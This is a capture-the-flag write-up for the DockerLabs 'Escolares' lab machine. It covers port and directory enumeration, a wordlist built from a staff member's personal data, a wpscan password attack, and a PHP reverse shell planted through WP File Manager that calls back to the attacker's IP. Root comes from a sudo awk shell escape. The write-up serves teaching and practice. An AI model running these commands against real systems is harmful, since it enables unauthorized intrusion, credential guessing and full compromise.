# Escolares - DockerLabs - Easy

## Summary

**Escolares** is an easy Linux machine from DockerLabs that involves web enumeration, OSINT-style credential discovery, WordPress exploitation via WP File Manager, and privilege escalation using `awk` with `sudo` NOPASSWD. The attack path begins with finding a hidden HTML comment pointing to a staff page that reveals personal data about the WordPress admin, which is used to build a targeted wordlist. Access to WordPress leads to a reverse shell via a malicious PHP file, and escalation to root is achieved through a GTFOBins `awk` technique.

---

## Tools

- `nmap` — port and service enumeration
- `gobuster` — web directory/file brute force
- `wpscan` — WordPress enumeration and password attack
- `hydra` — brute force (SSH and HTTP forms)
- `cewl` / manual wordlist — custom credential generation
- `netcat (nc)` — reverse shell listener
- `php-reverse-shell` (pentestmonkey) — PHP reverse shell payload

---

## 1. Enumeration

### Port Scan

```bash
nmap -sV -sC -p- 172.18.0.2
```

Open ports:
- **22** — SSH (OpenSSH)
- **80** — HTTP (Apache 2.4.58 on Ubuntu)

### Web Enumeration

```bash
gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 20
```

Key findings:
- `/index.html` — main university site
- `/info.php` — exposed phpinfo() page
- `/wordpress/` — WordPress installation
- `/phpmyadmin/` — phpMyAdmin panel
- `/contacto.html` — contact page with a hidden HTML comment

### WordPress User Enumeration

Browsing to `http://172.18.0.2/wordpress/` revealed the site title: **"Wordpress de Administracion TLuisillo_o"**, hinting at the admin username `luisillo`.

### Hidden Staff Page Discovery

Inspecting `contacto.html` revealed a hidden comment:

```html
<!-- INFORMACION DEL PERSONAL -->
<!-- ./profesores.html -->
```

Browsing to `http://172.18.0.2/profesores.html` exposed personal data for the WordPress admin:

```
Name:       Luis
Username:   luisillo
Matrícula:  19131337
DOB:        09/10/1981
Email:      luisillo@example.com
Alt text:   (admin wordpress)  ← confirms admin role
```

### Custom Wordlist Generation

Using the discovered personal data to build a targeted wordlist:

```bash
cewl http://172.18.0.2/profesores.html -d 2 -m 4 -o wordlist_profesores.txt
```

Manual additions based on OSINT (name + birth year patterns):

```
Luis1981
luisillo1981
Luis1337
luisillo1337
...
```

---

## 2. Exploitation

### WordPress Password Attack

```bash
wpscan --url http://172.18.0.2/wordpress/ -U luisillo -P escolares/luis.txt --password-attack xmlrpc
```

**Result:** `luisillo : Luis1981`

### Reverse Shell via WP File Manager

After logging into WordPress as `luisillo`, the **WP File Manager** plugin was accessible. The file `wordpress/index.php` was edited with a PHP reverse shell (pentestmonkey):

```php
$ip = '172.18.0.1';   // attacker IP on Docker network
$port = 4444;
```

Listener started:

```bash
nc -lvnp 4444
```

Shell triggered by visiting:

```
http://172.18.0.2/wordpress/index.php
```

**Shell obtained as:** `www-data`

---

## 3. Escalate Privileges

### www-data → luisillo

Browsing `/home` revealed a world-readable file:

```bash
cat /home/secret.txt
# Output: luisillopasswordsecret
```

```bash
su luisillo
# Password: luisillopasswordsecret
```

### luisillo → root (awk GTFOBins)

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/awk
```

TTY upgrade required first:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

Privilege escalation:

```bash
sudo /usr/bin/awk 'BEGIN {system("/bin/bash")}'
whoami
# root
```

---

## 4. Lessons Learned

1. **Source code / HTML comments can expose internal paths** — always inspect page source during enumeration.
2. **OSINT on staff pages yields targeted wordlists** — name + birth year combinations are common weak passwords.
3. **phpinfo() exposure is dangerous** — reveals server config, PHP version, loaded modules, and environment variables.
4. **WP File Manager is a critical attack surface** — if accessible to a low-privileged WP user, it allows arbitrary PHP execution.
5. **Credentials are sometimes stored in plaintext on the filesystem** — always check `/home`, `/tmp`, `/var/www` after shell access.
6. **`sudo` with NOPASSWD on scripting tools = instant root** — `awk`, `vim`, `python`, `perl`, etc. are all GTFOBins escalation paths.

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | *(check `/home/luisillo/`)* |
| root.txt | *(check `/root/`)* |